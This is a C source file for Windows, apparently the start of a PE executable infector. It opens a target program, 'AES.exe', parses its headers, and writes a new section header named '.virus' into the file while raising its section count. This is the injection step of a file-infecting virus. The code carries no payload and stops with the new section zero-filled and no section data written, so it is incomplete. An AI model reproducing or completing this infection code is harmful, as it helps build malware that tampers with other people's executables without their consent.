#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <Windows.h>

#define EXE_FILE_NAME "AES.exe"
#define V_SECT_NAME ".virus"

typedef WINBASEAPI WINBOOL WINAPI (*io_func)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
//   WINBASEAPI WINBOOL WINAPI WriteFile (HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
void io(io_func operation, BYTE *buffer, int size/*by Byte*/, HANDLE file, int offset_start/*FILE_BEGIN*/, LONG offset);
// void read(BYTE *buffer, int size/*by Byte*/, HANDLE file, int offset_start/*FILE_BEGIN*/, LONG offset);

int main()
{
    HANDLE file = CreateFile(EXE_FILE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) 
    {
        puts("Failed to open.");
        exit(1);
    }
    IMAGE_DOS_HEADER i_dos_header = {0};
    io(ReadFile, (BYTE*)&i_dos_header, sizeof(i_dos_header), file, FILE_BEGIN, 0);
    IMAGE_NT_HEADERS i_nt_headers = {0};
    io(ReadFile, (BYTE*)&i_nt_headers, sizeof(i_nt_headers), file, FILE_BEGIN, i_dos_header.e_lfanew);

    printf("%d\n", i_nt_headers.FileHeader.NumberOfSections);
    puts("Iterating through section headers...");
    IMAGE_SECTION_HEADER i_sect_header = {0};
    int total_v_size = 0;
    for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
    {
        io(ReadFile, (BYTE*)&i_sect_header, sizeof(i_sect_header), file, FILE_CURRENT, 0);
        puts(i_sect_header.Name);
        total_v_size += i_sect_header.Misc.VirtualSize;
    }
    
    // create new section header
    // position of end of IMAGE_SECTION_HEADERs (from FILE_BEGIN)
    int position = i_dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) 
        + i_nt_headers.FileHeader.NumberOfSections*sizeof(IMAGE_SECTION_HEADER);
    int space = i_nt_headers.OptionalHeader.FileAlignment 
        - position % i_nt_headers.OptionalHeader.FileAlignment;

    int infect = (strcmp(V_SECT_NAME, i_sect_header.Name) != 0) 
        && (space >= sizeof(IMAGE_SECTION_HEADER)); 

    IMAGE_SECTION_HEADER new_sect_header = {V_SECT_NAME, 0, 0, 0, 0, 0, 0, 0, 0, 0};

    assert(infect);
    io(WriteFile, (BYTE*)&new_sect_header, sizeof(new_sect_header), file, FILE_CURRENT, 0);
    i_nt_headers.FileHeader.NumberOfSections++;
    io(WriteFile, (BYTE*)&i_nt_headers, sizeof(i_nt_headers), file, FILE_BEGIN, i_dos_header.e_lfanew);

    int sect_end = position + space + total_v_size;
    // new_sect
    // io(WriteFile, (BYTE*)&i_nt_headers, sizeof(i_nt_headers), file, FILE_BEGIN, i_dos_header.e_lfanew);

    // BYTE *ptr = (BYTE*)(&i_dos_header);
    // for (int i = 0; i < sizeof(i_dos_header); i++)
    // {
    //     printf("%02X ", ptr[i]);
    //     if ((i+1) % 0x10 ==  0)
    //     {
    //         puts("");
    //     }
    // }
    
}

void io(io_func operation, BYTE *buffer, int size/*by Byte*/, HANDLE file, int offset_start/*FILE_BEGIN*/, LONG offset)
{
    DWORD bytesRead = 0;

    if (SetFilePointer(file, offset, NULL, offset_start) == INVALID_SET_FILE_POINTER)
    {
        puts("Err when set pointer");
        exit(1);
    }
    if (!operation(file, buffer, size, &bytesRead, NULL)) 
    {
        puts("Failed to read.");
        CloseHandle(file);
        exit(1);
    }
}

